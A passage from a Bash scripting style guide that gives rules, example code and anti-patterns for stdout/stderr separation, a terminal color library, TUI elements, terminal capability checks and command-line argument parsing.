$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}

# ============================================================================
# Main Logic
# ============================================================================

main() {
  local -- username
  local -- user_home
  local -i num=420

  # Parse arguments (messaging functions for progress)
  while (($#)); do case $1 in
    -n|--num)     shift
                  num=${1:-$num}
                  ;;
    -v|--verbose) VERBOSE+=1
                  ;;
    -q|--quiet)   VERBOSE=0
                  ;;
    -D|--debug)   DEBUG=1
                  ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"
                  return 0
                  ;;
    -h|--help)    show_help
                  return 0
                  ;;
    --)           shift; break
                  ;;
    -[nvqDVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                  ;;
    -*)           error "Invalid option ${1@Q}"
                  return 22
                  ;;
    *)            break
                  ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG

  # Validate arguments (error message)
  if (($# != 1)); then
    error 'Expected exactly one argument'
    show_help
    return 22
  fi

  username="$1"

  # Operational status (messaging functions to stderr)
  info "Looking up user ${username@Q}"

  # Get data (echo to stdout)
  if ! user_home=$(get_user_home "$username"); then
    error "User not found ${username@Q}"
    return 1
  fi

  # Operational status (messaging function)
  success "Found user ${username@Q}"

  # Data output (echo to stdout) - always displays
  show_report

  # Operational status (messaging function)
  info 'Report generation complete'
}

main "$@"
#fin
```

**Running the example:**

```bash
# Without verbose - only data output and errors
$ ./script.sh -q alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home

# With verbose - operational messages visible (to stderr)
$ ./script.sh -v alice
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home
script.sh: ◉ Report generation complete

# Pipe output (only stdout data piped, stderr messages visible)
$ ./script.sh -v alice | grep Shell
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
Shell: /bin/bash
script.sh: ◉ Report generation complete

# Redirect output (data to file, messages to terminal)
$ ./script.sh -v alice > report.txt
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
script.sh: ◉ Report generation complete

$ cat report.txt
User Report
===========
...
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  local -- email=$1
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email alice)  # $email is empty!

# ✓ Correct - use echo for data output
get_user_email() {
  local -- email=$1
  echo "$email"  # Goes to stdout, can be captured
}
email=$(get_user_email alice)  # $email contains value

# ✗ Wrong - using echo for operational status
process_file() {
  local -- file=$1
  echo "Processing ${file@Q}..."  # Goes to stdout - mixes with data!
  cat "$file"
}

# ✓ Correct - use messaging function for status
process_file() {
  local -- file=$1
  info "Processing ${file@Q}..."  # Goes to stderr - separated from data
  cat "$file"                     # Data to stdout
}

# ✗ Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'
  info '  -v  Verbose mode'
  info '  -h  Show help'
}
# Won't display if VERBOSE=0!

# ✓ Correct - help text using echo/cat
show_help() {
  cat <<HELP
Usage: script.sh [OPTIONS]
  -v  Verbose mode
  -h  Show help
HELP
}

# ✗ Wrong - mixing data and status on same stream
list_files() {
  echo 'Listing files...'  # Status to stdout
  ls                       # Data to stdout
}
# Can't parse output cleanly!

# ✓ Correct - status to stderr, data to stdout
list_files() {
  info 'Listing files...'  # Status to stderr
  ls                        # Data to stdout
}

# ✗ Wrong - error messages to stdout
validate_input() {
  if [[ ! -f "$1" ]]; then
    echo "File not found ${1@Q}"  # To stdout - wrong stream!
    return 1
  fi
}

# ✓ Correct - error messages to stderr
validate_input() {
  if [[ ! -f "$1" ]]; then
    error "File not found ${1@Q}"  # To stderr - correct stream
    return 1
  fi
}

# ✗ Wrong - data output respecting VERBOSE
get_count() {
  local -i count=10
  ((VERBOSE)) || return 0
  echo "$count"  # Data not shown if VERBOSE=0!
}

# ✓ Correct - data always outputs
get_count() {
  local -i count=10
  echo "$count"  # Always outputs data
}

# ✗ Wrong - multi-line help with info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'
  info ''
  info 'Options:'
  info '  -v  Verbose'
}
# Verbose-dependent, ugly formatting

# ✓ Correct - multi-line help with echo/cat
show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - A brief description

A longer description.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -v  Verbose

Examples:

HELP
}
```

**Edge cases and borderline scenarios:**

**1. Version output:**

```bash
# Version is data output (always display)
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo
}

# Not this:
show_version() {
  info "$SCRIPT_NAME $VERSION"  # Wrong - version won't show if VERBOSE=0
}
```

**2. Progress during data generation:**

```bash
# Need progress while generating data
generate_data() {
  local -i i

  # Progress to stderr
  info 'Generating data...'

  # Data to stdout
  for ((i=1; i<=100; i+=1)); do
    echo "line $i"
  done

  # Completion status to stderr
  success 'Data generation complete'
}

# Caller can capture data, see progress
data=$(generate_data)
```

**3. Conditional output formatting:**

```bash
# Different output for interactive vs non-interactive
show_result() {
  if [[ -t 1 ]]; then
    # Interactive terminal - use messaging functions
    success 'Operation completed'
    info "Result: $result"
  else
    # Non-interactive/piped - use plain echo
    echo "$result"
  fi
}
```

**4. Error context in functions:**

```bash
# Function can use messaging for context, return code for status
validate_config() {
  local -- config_file=$1

  if [[ ! -f "$config_file" ]]; then
    error "Config file not found ${config_file@Q}"
    return 2
  fi

  if [[ ! -r "$config_file" ]]; then
    error "Config file not readable ${config_file@Q}"
    return 5
  fi

  # Validation passed - no output needed
  return 0
}

# Caller handles based on return code
if ! validate_config "$config"; then
  die $? 'Configuration validation failed'
fi
```

**5. Logging vs user messages:**

```bash
# Log to file (echo), message to user (messaging function)
process_item() {
  local -- item=$1

  # Log entry (data to stdout, redirected to file)
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"

  # User message (status to stderr)
  info "Processing $item..."
}

# Usage with logging
process_item "$item" >> "$log_file"
```

**Testing stream separation:**

```bash
# Test that data goes to stdout
test_data_output() {
  local -- output

  output=$(get_user_home alice)

  [[ -n "$output" ]] || die 1 'Expected output from get_user_home'
  info 'Test passed: Data captured correctly'
}

# Test that messages don't interfere with data capture
test_message_separation() {
  local -- output

  # Capture stdout only
  output=$(
    info 'Starting process...'  # To stderr - not captured
    echo 'data'                  # To stdout - captured
    success 'Process complete'   # To stderr - not captured
  )

  [[ "$output" == 'data' ]] || die 1 "Expected 'data', got ${output@Q}"
  info 'Test passed: Messages separate from data'
}
```

**Summary:**

- **Use messaging functions** for operational status, diagnostics, and user-facing messages
- **Use plain `echo`** for data output, help text, structured reports, and parseable output
- **Stream separation**: Messaging to stderr (user-facing), echo to stdout (data/parseable)
- **Verbosity**: Messaging functions respect `VERBOSE`, echo always displays
- **Pipeability**: Only stdout (echo) should contain data for piping/capturing
- **Multi-line output**: Use echo with here-docs, not multiple messaging function calls
- **Error messages**: Always to stderr (use `error()` or `>&2 echo`)
- **Help/version**: Always display (echo), never verbose-dependent

**Key principle:** The choice between echo and messaging functions is fundamentally about stream separation. Operational messages (how the script is working) belong on stderr via messaging functions. Data output (what the script produces) belongs on stdout via echo. This separation enables proper script composition, piping, and redirection while keeping users informed of progress.


---


**Rule: BCS0706**

## Color Management Library

For scripts requiring more sophisticated color management than inline declarations (BCS0701), use a dedicated color management library that provides a two-tier system, automatic terminal detection, and integration with the BCS \_msg system (BCS0703).

**Rationale:**

- **Namespace Control**: Two-tier system (basic vs complete) prevents pollution of the global namespace
- **Flexibility**: Auto-detection, force-on, or force-off modes for different deployment scenarios
- **_msg Integration**: `flags` option sets standard BCS control variables (VERBOSE, DEBUG, DRY_RUN, PROMPT)
- **Reusability**: Dual-purpose pattern (BCS010201) allows sourcing as library or executing for demonstration
- **Maintainability**: Centralized color definitions rather than scattered inline declarations
- **Testing**: Built-in verbose mode for debugging color variable states

**Two-Tier Color System:**

**Basic tier (5 variables)** - Default, minimal namespace pollution:
```bash
NC          # No Color / Reset
RED         # Error messages
GREEN       # Success messages
YELLOW      # Warnings
CYAN        # Information
```

**Complete tier (12 variables)** - Opt-in, full ANSI capability:
```bash
# Basic tier (above) plus:
BLUE        # Additional color option
MAGENTA     # Additional color option
BOLD        # Text emphasis
ITALIC      # Text styling
UNDERLINE   # Text emphasis
DIM         # De-emphasized text
REVERSE     # Inverted colors
```

**Library Function Signature:**

```bash
color_set [OPTIONS...]
```

**Options (combinable in any order):**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (checks stdout AND stderr) (default) |
| `always` | Force colors on (even when piped/redirected) |
| `never`, `none` | Force colors off |
| `verbose`, `-v`, `--verbose` | Print all variable declarations |
| `flags` | Set BCS \_msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |
| `--help`, `-h`, `help` | Display usage (executable mode only) |

**BCS _msg System Integration:**

The `flags` option initializes standard BCS control variables used by core message functions (BCS0703):

```bash
source color-set
color_set complete flags

# Now these globals are set:
# VERBOSE=1 (or preserved if already set)
# DEBUG=0
# DRY_RUN=1
# PROMPT=1
```

This integration enables one-line initialization of both colors and messaging control:
```bash
#!/bin/bash
source /usr/local/lib/color-set
color_set complete flags

# Colors and _msg system now ready
info 'Starting process'
success 'Operation completed'
```

**Dual-Purpose Pattern (BCS010201):**

The library implements the dual-purpose pattern, working both as a sourceable library and standalone utility:

```bash
# Usage 1: Source as library (traditional)
source color-set
color_set complete
echo "${RED}Error:${NC} Failed"

# Usage 2: Source as library (enhanced - auto-calls color_set)
source color-set complete
echo "${RED}Error:${NC} Failed"

# Usage 3: Execute for demonstration
./color-set complete verbose
./color-set --help
```

The enhanced sourcing syntax passes arguments directly to `color_set`, eliminating the need for a separate function call.

**Implementation Example:**

```bash
#!/bin/bash
#shellcheck disable=SC2015
# color-set - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose)
                verbose=1 ;;
      always)   color=1 ;;
      never|none)
                color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "${FUNCNAME[0]}: ✗ Invalid argument ${1@Q}"
                return 2 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; } ||:

  # Set BCS control flags if requested
  if ((flags)); then
    declare -igx VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -igx DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -gx NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -gx BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -gx NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -gx BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE ||:
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT ||:
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } ||:
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: enhanced syntax support
[[ ${BASH_SOURCE[0]} == "$0" ]] || {
  (($#)) && color_set "$@" || :
  return 0
}

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

declare -r VERSION=1.0.1

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<HELP
color-set $VERSION [OPTIONS...]

Dual-purpose bash library for terminal color management with ANSI escape codes.

MODES:
  Source as library:  source color-set; color_set [OPTIONS]
  Execute directly:   color-set [OPTIONS]

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]

  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]

  verbose, -v       Print variable declarations
  --verbose

  flags             Set standard BCS globals for _msg system messaging constructs
                    • With 'basic': Sets VERBOSE only
                    • With 'complete': Sets VERBOSE, DEBUG, DRY_RUN, PROMPT

BASIC TIER (5 variables):
  NC, RED, GREEN, YELLOW, CYAN

COMPLETE TIER (+7 additional variables):
  BLUE, MAGENTA, BOLD, ITALIC, UNDERLINE, DIM, REVERSE

EXAMPLES:
  color-set complete verbose
  color-set always
  source color-set && color_set complete && echo "\${RED}Error\${NC}"

OPTIONS can be combined in any order.
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

**Basic usage:**
```bash
#!/bin/bash
source color-set
color_set basic

echo "${RED}Error:${NC} Operation failed"
echo "${GREEN}Success:${NC} Operation completed"
echo "${YELLOW}Warning:${NC} Deprecated feature"
```

**Complete tier with attributes:**
```bash
source color-set
color_set complete

echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"
echo "${UNDERLINE}Important${NC}"
```

**Force colors for piped output:**
```bash
#!/bin/bash
source color-set
color_set complete always

# Colors preserved even when piped
./script.sh | less -R
```

**Disable colors for logging:**
```bash
#!/bin/bash
source color-set
color_set never

# No ANSI codes in log files
exec > /var/log/script.log 2>&1
```

**Integrated with BCS _msg system:**
```bash
#!/bin/bash
# Enhanced syntax: source and configure in one line
source color-set complete flags

# Now have colors AND messaging functions
info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"      # Uses GREEN, respects VERBOSE
error "Connection failed"      # Uses RED, always shown
debug "State: x=$x"            # Uses YELLOW, respects DEBUG
```

**Testing color variables:**
```bash
# Show all variables in current shell
source color-set
color_set complete verbose

# Test as executable
./color-set complete verbose

# Test piped output (should disable colors)
./color-set auto verbose | cat
```

**Anti-patterns:**

❌ **Scattered inline color declarations:**
```bash
# DON'T: Duplicate declarations across scripts
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
# ... repeated in every script
```

❌ **Always loading complete tier:**
```bash
# DON'T: Pollute namespace when only need basic colors
source color-set
color_set complete  # Unnecessary if only using RED/GREEN/YELLOW/CYAN
```

❌ **Testing only stdout:**
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1  # Fails when stderr redirected
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1 || color=0
```

❌ **Forcing colors without user control:**
```bash
# DON'T: Hardcode color mode
color_set always
# DO: Respect environment or provide flag
color_set ${COLOR_MODE:-auto}
```

**Reference Implementation:**

See `/usr/local/lib/color-set` or https://github.com/Open-Technology-Foundation/color-set

**Cross-References:**

- **BCS0701** (Standardized Messaging and Color Support) - Basic inline color pattern that this enhances
- **BCS0703** (Core Message Functions) - _msg system that uses these colors and control flags
- **BCS010201** (Dual-Purpose Scripts) - Pattern this library implements

**Ref:** BCS0706


---


**Rule: BCS0707**

## TUI Basics

**Rule: BCS0907**

Creating text-based user interface elements in terminal scripts.

---

#### Rationale

TUI elements provide:
- Visual feedback for long-running operations
- Interactive prompts and menus
- Progress indication
- Better user experience

---

#### Progress Indicators

```bash
# Simple spinner
spinner() {
  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while ((1)); do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1
    sleep 0.1
  done
}

# Start spinner in background
spinner 'Processing...' &
spinner_pid=$!

# Do work...
long_operation

# Stop spinner
kill "$spinner_pid" 2>/dev/null
printf '\r\033[K'  # Clear line
```

#### Progress Bar

```bash
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -i empty=$((width - filled))
  local -- bar

  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$empty" '' | tr ' ' '░')

  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Usage
declare -i i
for ((i=1; i<=100; i+=1)); do
  progress_bar "$i" 100
  sleep 0.05
done
echo
```

#### Cursor Control

```bash
# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT

# Move cursor
move_up() { printf '\033[%dA' "${1:-1}"; }
move_down() { printf '\033[%dB' "${1:-1}"; }
move_to() { printf '\033[%d;%dH' "$1" "$2"; }

# Clear operations
clear_line() { printf '\033[2K\r'; }
clear_screen() { printf '\033[2J\033[H'; }
clear_to_end() { printf '\033[J'; }
```

#### Interactive Menu

```bash
select_option() {
  local -a options=("$@")
  local -i selected=0
  local -- key

  hide_cursor
  trap 'show_cursor' RETURN

  while ((1)); do
    # Display menu
    local -i i
    for ((i=0; i<${#options[@]}; i+=1)); do
      if ((i == selected)); then
        printf '  \033[7m %s \033[0m\n' "${options[i]}"
      else
        printf '   %s\n' "${options[i]}"
      fi
    done

    # Read keypress
    IFS= read -rsn1 key
    case $key in
      $'\x1b')  # Escape sequence
        read -rsn2 key
        case "$key" in
          '[A') ((selected > 0)) && ((selected-=1)) ;;  # Up
          '[B') ((selected < ${#options[@]}-1)) && ((selected+=1)) ;;  # Down
        esac
        ;;
      '') break ;;  # Enter
    esac

    # Move cursor back up
    printf '\033[%dA' "${#options[@]}"
  done

  show_cursor
  return "$selected"
}

# Usage
select_option 'Option 1' 'Option 2' 'Option 3'
selected=$?
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not a terminal

# ✓ Correct - check for terminal
if [[ -t 1 ]]; then
  progress_bar 50 100
else
  echo '50% complete'
fi
```

---

**See Also:** BCS0908 (Terminal Capabilities), BCS0701 (Color Support)


---


**Rule: BCS0708**

## Terminal Capabilities

**Rule: BCS0908**

Detecting and utilizing terminal features safely.

---

#### Rationale

Terminal capability detection:
- Ensures scripts work in all environments
- Provides graceful fallbacks for limited terminals
- Enables rich output when available
- Prevents garbage output in non-terminal contexts

---

#### Terminal Detection

```bash
declare -i USE_COLORS
# Check if stdout is a terminal
if [[ -t 1 ]]; then
  # Terminal - can use colors, cursor control
  USE_COLORS=1
else
  # Pipe or redirect - plain output only
  USE_COLORS=0
fi

# Check both stdout and stderr
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -r RED='' NC=''
fi
```

#### Terminal Size

```bash
# Get terminal dimensions
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80
    TERM_ROWS=24
  fi
}

# Auto-update on resize
trap 'get_terminal_size' WINCH
get_terminal_size
```

#### Capability Checking

```bash
# Check for specific capability
has_capability() {
  local -- cap=$1
  tput "$cap" &>/dev/null
}

# Use with fallback
if has_capability colors; then
  num_colors=$(tput colors)
  ((num_colors >= 256)) && USE_256_COLORS=1 ||:
fi

# Check for Unicode support
has_unicode() {
  [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]
}
```

#### Safe Output Functions

```bash
# Width-aware output
print_line() {
  local -i width=${TERM_COLS:-80}
  printf '%*s\n' "$width" '' | tr ' ' '─'
}

# Truncate to terminal width
truncate_string() {
  local -- str=$1
  local -i max=${2:-$TERM_COLS}

  if ((${#str} > max)); then
    echo "${str:0:$((max-3))}..."
  else
    echo "$str"
  fi
}

# Center text
center_text() {
  local -- text=$1
  local -i width=${TERM_COLS:-80}
  local -i padding=$(((width - ${#text}) / 2))

  printf '%*s%s\n' "$padding" '' "$text"
}
```

#### ANSI Code Reference

```bash
# Common ANSI escape codes
declare -r ESC=$'\033'

# Colors (foreground)
declare -r BLACK="${ESC}[30m"  RED="${ESC}[31m"
declare -r GREEN="${ESC}[32m"  YELLOW="${ESC}[33m"
declare -r BLUE="${ESC}[34m"   MAGENTA="${ESC}[35m"
declare -r CYAN="${ESC}[36m"   WHITE="${ESC}[37m"

# Styles
declare -r BOLD="${ESC}[1m"    DIM="${ESC}[2m"
declare -r ITALIC="${ESC}[3m"  UNDERLINE="${ESC}[4m"
declare -r BLINK="${ESC}[5m"   REVERSE="${ESC}[7m"

# Reset
declare -r NC="${ESC}[0m"
declare -n RESET=NC

# Cursor
declare -r HIDE_CURSOR="${ESC}[?25l"
declare -r SHOW_CURSOR="${ESC}[?25h"
declare -r SAVE_CURSOR="${ESC}7"
declare -r RESTORE_CURSOR="${ESC}8"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - assuming terminal support
echo -e '\033[31mError\033[0m'  # May output garbage

# ✓ Correct - conditional output
if [[ -t 1 ]]; then
  echo -e '\033[31mError\033[0m'
else
  echo 'Error'
fi
```

```bash
# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"  # May wrap or truncate wrong

# ✓ Correct - use terminal width
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

---

**See Also:** BCS0907 (TUI Basics), BCS0906 (Color Management)


---


**Rule: BCS0800**

# Command-Line Arguments

This section establishes the standard argument parsing pattern that supports both short options (`-h`, `-v`) and long options (`--help`, `--version`), ensuring consistent command-line interfaces across all scripts. It defines the canonical version output format (`scriptname X.Y.Z`), explains validation patterns for checking required arguments and detecting option conflicts, and provides guidance on where to place argument parsing logic (main function vs top-level) based on script complexity. These patterns make scripts predictable, user-friendly, and maintainable while supporting both interactive and automated usage.


---


**Rule: BCS0801**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth=$1 ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;
  -q|--quiet)     VERBOSE=0 ;;

  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
  -h|--help)      show_help; exit 0 ;;

  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern breakdown and rationale:**

**1. Loop structure: `while (($#)); do ... done`**
- `(($#))` - Arithmetic test, true while arguments remain
- More efficient than `while [[ $# -gt 0 ]]`
- Exits when no arguments left

**2. Case statement: `case $1 in ... esac`**
- Matches current argument (`$1`) against patterns
- Supports multiple patterns per branch: `-a|--add`
- More readable than nested if/elif chains

**3. Options with arguments:**
```bash
-m|--depth)     noarg "$@"; shift
                max_depth=$1 ;;
```
- `noarg "$@"` - Validates argument exists (prevents "missing argument" errors)
- `shift` - Moves to next argument (the value)
- `max_depth="$1"` - Captures the value
- Second `shift` at end of loop moves past the value

**4. Options without arguments (flags):**
```bash
-p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
-v|--verbose)   VERBOSE+=1 ;;
```
- Just set variables, no shift needed (handled at loop end)
- Can set multiple variables per option
- `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`

**5. Options that exit immediately:**
```bash
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
-h|--help)      show_help; exit 0 ;;
```
- Print information and exit
- No shift needed (script exits)
- Use `exit 0` (success exit code)
- If within a function, use `return 0`

**6. Short option bundling:**
In command argument processing loops, short option splitting should *always* be included.

```bash
-[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```
- **Purpose**: Allows `-vpL` instead of `-v -p -L`
- **Pattern**: `-[amLpvqVh]*` matches any short option combination
- **Mechanism**: Splits bundled options into separate arguments
- **Example**: `-vpL file` becomes `-v -p -L file`
- **How it works:**
  1. `${1:1}` - Remove leading dash (e.g., `-vpL` → `vpL`)
  2. `grep -o .` - Split into individual characters
  3. `printf -- "-%c "` - Add dash before each character
  4. `set --` - Replace argument list with expanded options

**7. Invalid option handling:**
```bash
-*)             die 22 "Invalid option ${1@Q}" ;;
```
- Catches any unrecognized option starting with `-`
- Uses exit code 22 (EINVAL - invalid argument)
- Shows which option was invalid

**8. Positional arguments:**
```bash
*)              Paths+=("$1") ;;
```
- Default case: Not an option, must be positional argument
- Append to array for later processing
- Allows unlimited positional arguments

**9. Mandatory shift at end:**
```bash
esac; shift; done
```
- `shift` after every iteration moves to next argument
- Critical: Without this, infinite loop!
- Placed after `esac` to handle all branches uniformly

**The `noarg` helper function:**

```bash
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
```

- **Purpose**: Validates that option requiring an argument has one
- **Check**: `(($# > 1))` - At least 2 args (option + value)
- **Usage**: Always call before shifting to capture argument value
- **Example**: `./script -m` (missing value) → "Option '-m' requires an argument"

**Complete example with all features:**

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -vno result.txt *.txt
HELP
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support
    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file" ||:

  # Process files (example logic)
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing ${file@Q}" ||:
    # Processing logic here
  done

  ((VERBOSE)) && echo "Would write results to ${output_file@Q}" ||:
}

main "$@"
#fin
```

**Short option bundling examples:**

```bash
# These are equivalent:
./script -v -n -o output.txt file.txt
./script -vno output.txt file.txt

# These are equivalent:
./script -v -v -v file.txt
./script -vvv file.txt

# Mixed long and short:
./script --verbose -no output.txt --dry-run file.txt
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using while [[ ]] instead of (())
while [[ $# -gt 0 ]]; do  # Verbose, less efficient

# ✓ Correct
while (($#)); do

# ✗ Wrong - not calling noarg before shift
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!

# ✓ Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

# ✗ Wrong - forgetting shift at loop end
while (($#)); do case $1 in
  ...
esac; done  # Infinite loop!

# ✓ Correct
while (($#)); do case $1 in
  ...
esac; shift; done

# ✗ Wrong - using if/elif chains instead of case
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
  VERBOSE+=1
elif [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
  show_help
  ...
fi

# ✓ Correct - use case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -h|--help)    show_help; exit 0 ;;
  ...
esac
```

**Rationale for this pattern:**

1. **Consistent**: Same structure works for all scripts
2. **Flexible**: Handles options with/without arguments, bundled shorts
3. **Safe**: Validates arguments exist before using them
4. **Readable**: Case statement is more scannable than if/elif chains
5. **Efficient**: Arithmetic test `(($#))` faster than `[[ ]]`
6. **Standard**: Follows Unix conventions (short/long options, bundling)


---


**Rule: BCS0802**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

